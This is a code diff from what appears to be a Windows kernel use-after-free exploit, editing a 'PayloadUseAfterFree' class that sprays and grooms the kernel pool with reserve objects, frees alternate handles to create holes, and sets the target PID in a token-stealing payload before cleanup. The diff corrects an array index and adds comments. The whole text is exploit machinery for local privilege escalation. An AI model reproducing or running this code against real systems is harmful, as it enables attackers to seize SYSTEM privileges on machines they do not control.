@@ -4,22 +4,25 @@ namespace payload_use_after_free {
 
 	bool PayloadUseAfterFree :: prepare_memory() {
 		for (unsigned int i = 0; i < poolDefragSz; i++) {
+//			hReserveObjectsDefrag[i] = CreateEvent(NULL, false, false, NULL);
 			if (!NT_SUCCESS(_NtAllocateFunc(&hReserveObjectsDefrag[i], 0, IOCO))) {
 				return false;
 			}
 		}
 
 		for (unsigned int i = 0; i < poolGroomSz; i++) {
+//			hReserveObjectsPoolGroom[i] = CreateEvent(NULL, false, false, NULL);
 			if (!NT_SUCCESS(_NtAllocateFunc(&hReserveObjectsPoolGroom[i], 0, IOCO))) {
 				return false;
 			}
 		}
 
+		// Windows Kernel Pool Spraying
 		for (unsigned int i = 1; i < poolGroomSz; i += 2) {
 			if ((NULL != hReserveObjectsPoolGroom[i]) && 
 				(INVALID_HANDLE_VALUE != hReserveObjectsPoolGroom[i])){
 				CloseHandle(hReserveObjectsPoolGroom[i]);
-				hReserveObjectsDefrag[i] = 0;
+				hReserveObjectsPoolGroom[i] = 0;
 			}
 		}
 		return true;
@@ -48,7 +51,6 @@ namespace payload_use_after_free {
 				hReserveObjectsDefrag[i] = 0;
 			}
 		}
-
 		for (unsigned int i = 0; i < poolGroomSz; i += 2) {
 			if ((NULL != hReserveObjectsPoolGroom[i]) &&
 				(INVALID_HANDLE_VALUE != hReserveObjectsPoolGroom[i])) {
@@ -56,15 +58,12 @@ namespace payload_use_after_free {
 				hReserveObjectsPoolGroom[i] = 0;
 			}
 		}
-
 		if (_buffer) {
 			if (payloads::set_memory_permission(PAGE_READWRITE)) {
-
 				// Restore default 'PID' value in the payload
 				payloads::set_pid_to_payload(payloads::g_dwDefaultPid, TokenStealingPayloadUAF);
 				HeapFree(GetProcessHeap(), 0, _buffer);
 			}
 		}
 	}
-
 }
